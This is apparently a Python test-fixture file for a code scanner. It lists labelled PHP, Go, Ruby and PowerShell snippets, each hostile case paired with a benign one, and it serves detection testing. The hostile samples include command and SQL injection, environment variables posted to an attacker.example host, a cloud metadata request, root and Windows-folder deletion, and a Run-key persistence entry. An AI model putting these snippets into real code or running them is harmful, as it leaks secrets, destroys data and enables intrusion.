"""Short per-language cases for the languages without a full front-end (PHP, Go, Ruby, PowerShell): each behaviour has a benign twin.
Scan-only; nothing here is executed."""

SEMANTIC_POLY = []


def S(id_, cats, code, lang):
    SEMANTIC_POLY.append((id_, cats, code, lang))


BS = chr(92)

# --- PHP
S("php_exec_user", "destructive_command", "<?php\n$host = $_GET['host'];\nsystem('ping -c 1 ' . $host);\n", "php")
S("php_exec_const_ok", "benign", "<?php\n$out = shell_exec('uptime');\necho $out;\n", "php")
S("php_sqli", "data_exfiltration", "<?php\n$id = $_GET['id'];\n$r = mysqli_query($db, \"SELECT * FROM users WHERE id = $id\");\n", "php")
S("php_prepared_ok", "benign", "<?php\n$st = $db->prepare('SELECT * FROM users WHERE id = ?');\n$st->execute([$_GET['id']]);\n", "php")
S("php_env_to_webhook", "data_exfiltration", "<?php\n$u = 'https://hooks.attacker.example/x';\n$d = json_encode(getenv());\n$c = curl_init($u);\ncurl_setopt($c, CURLOPT_POSTFIELDS, $d);\ncurl_exec($c);\n", "php")
S("php_ping_ok", "benign", "<?php\n$u = 'https://api.example.com/health';\n$c = curl_init($u);\ncurl_exec($c);\n", "php")
# --- Go
S("go_exec_user", "destructive_command", "package main\nimport (\"net/http\"; \"os/exec\")\nfunc h(w http.ResponseWriter, r *http.Request) {\n\texec.Command(\"sh\", \"-c\", r.URL.Query().Get(\"cmd\")).Run()\n}\n", "go")
S("go_exec_const_ok", "benign", "package main\nimport \"os/exec\"\nfunc main() {\n\texec.Command(\"ls\", \"-l\").Run()\n}\n", "go")
S("go_metadata", "ssrf_network_exfil", "package main\nimport \"net/http\"\nfunc main() {\n\thttp.Get(\"http://169.254.169.254/latest/meta-data/\")\n}\n", "go")
S("go_rm_root", "destructive_command", "package main\nimport \"os\"\nfunc main() {\n\tos.RemoveAll(\"/\")\n}\n", "go")
S("go_tmp_cleanup_ok", "benign", "package main\nimport \"os\"\nfunc main() {\n\tos.RemoveAll(\"/tmp/build-cache\")\n}\n", "go")
# --- Ruby
S("rb_exec_user", "destructive_command", "require 'sinatra'\nget '/run' do\n  system(params[:cmd])\nend\n", "ruby")
S("rb_exec_const_ok", "benign", "require 'json'\nputs `uptime`\n", "ruby")
S("rb_env_to_c2", "data_exfiltration", "require 'net/http'\nuri = URI('https://attacker.example/c')\nNet::HTTP.post(uri, ENV.to_h.to_json)\n", "ruby")
# --- PowerShell
S("ps_runkey", "persistence_or_privesc", "Set-ItemProperty -Path 'HKCU:" + BS + "Software" + BS + "Microsoft" + BS + "Windows" + BS + "CurrentVersion" + BS + "Run' -Name Upd -Value 'C:" + BS + "Temp" + BS + "x.exe'\n", "powershell")
S("ps_get_process_ok", "benign", "Get-Process | Where-Object { $_.CPU -gt 100 } | Select-Object Name, CPU\n", "powershell")
S("ps_remove_root", "destructive_command", "Remove-Item -Recurse -Force C:" + BS + "Windows\n", "powershell")
S("ps_remove_temp_ok", "benign", "Remove-Item -Recurse -Force C:" + BS + "Temp" + BS + "build_cache\n", "powershell")
